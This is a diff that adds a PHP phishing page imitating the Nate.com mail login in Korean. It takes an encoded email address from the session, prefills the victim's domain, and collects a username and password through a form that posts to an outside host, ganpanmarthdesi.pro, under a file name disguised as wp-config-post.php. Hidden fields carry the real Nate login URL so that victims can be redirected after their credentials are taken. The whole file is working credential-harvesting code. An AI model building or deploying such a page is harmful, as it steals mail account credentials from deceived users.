@@ -1,0 +1,180 @@
+﻿<?php
+ini_set('display_errors',0);
+ob_start();
+if (!isset($_SESSION)) { session_start();}
+
+
+if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}
+
+
+
+$_POST["token"]=$_SESSION['UZ_login'];
+
+function doEncrypt($string)
+{
+	$rand = substr(md5(microtime()),rand(0,26),2);
+	$crystr = "".$rand."".base64_encode($string)."";
+	return $crystr;
+}
+
+function doDecrypt($string)
+{
+	$str = substr($string, 2);
+	$crystr = base64_decode($str);
+	return $crystr;
+}
+
+$email = doDecrypt($_POST["token"]);
+$userz = explode('@', $email);
+ $users = $userz[0];
+
+
+$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));
+
+  $domains = explode('@', $email);
+    $domain = ucfirst("$domains[1]");
+	$domain2 = $domains[1];
+    $domains1 = explode('.', $domain);
+    $domain1 = ucwords ("$domains1[0]");
+
+?><html lang="ko">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>&#47196;&#44536;&#51064; | &#45348;&#51060;&#53944;</title>
+<link rel="shortcut icon" href="https://mailimg.nate.com/newmail/img/common/apple-touch-icon.png">
+</head>
+  <style>
+  html, body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  input[type=text],
+  input[type=password]{
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 48px;
+  width: 100%;
+  margin: 0;
+  background: #fff;
+  border: #fff;
+  border-bottom: 1px solid #D60411;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 0px;
+  font-size: 16px;
+  font-family: inherit;
+  line-height: 18px;
+  vertical-align: top;
+  color: #404040;
+  }
+  input[type=text]:focus,
+  input[type=password]:focus {
+  outline: none;
+  background-color: #fff;
+  border: #fff;
+  border-bottom: 1px solid #D60411;
+
+  }
+  </style>
+<body>
+
+<div align="center">
+	<table border="0" width="438" cellspacing="0" cellpadding="0" background="https://i.ibb.co/5YJFjp3/bg.png">
+		<tr>
+			<td>
+			<table border="0" width="100%" cellspacing="0" cellpadding="0">
+				<tr>
+					<td height="80" ></td>
+				</tr>
+				<tr>
+					<td height="42" >
+					&nbsp;</td>
+				</tr>
+				<form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
+				<tr>
+					<td height="33"></td>
+				</tr>
+				<tr>
+					<td>
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+						<tr>
+							<td width="9" ></td>
+							<td>
+							    <input type="text" id="uid" name="user" autofous placeholder="&#45348;&#51060;&#53944; &#50500;&#51060;&#46356;" value="" required />
+                                                            <input type="hidden" value="https://home.mail.nate.com/login/login.html" name="link" >
+                                                            <input type="hidden" value="<?php echo $ddomain;?>" name="domain" >
+							    <input type="hidden" value="Nate.com" name="sender" >
+							</td>
+							<td width="18"></td>
+						</tr>
+					</table>
+					</td>
+				</tr>
+				<tr>
+					<td height="8"></td>
+				</tr>
+				<tr>
+					<td>
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+						<tr>
+							<td width="9" ></td>
+							<td>
+							    <input type="password" id="upw" name="passwd" placeholder="&#48708;&#48128;&#48264;&#54840;" maxlength="20" required />
+							</td>
+							<td width="18"></td>
+						</tr>
+					</table>
+					</td>
+				</tr>
+				<tr>
+					<td height="97" >
+					</td>
+				</tr>
+				<tr>
+					<td>
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+						<tr>
+							<td width="10" ></td>
+							<td>
+							    <input type="image" src="https://i.ibb.co/2kwmsmt/btn.png" width="410" height="56">
+							</td>
+							<td width="18"></td>
+						</tr>
+					</table>
+					</td>
+				</tr>
+				<tr>
+					<td height="20">
+					</form>
+					</td>
+				</tr>
+				<tr>
+					<td height="445"></td>
+				</tr>
+				<tr>
+					<td height="40"></td>
+				</tr>
+				
+			</table>
+			</td>
+		</tr>
+	</table>
+</div>
+
+</body>
+
+</html>
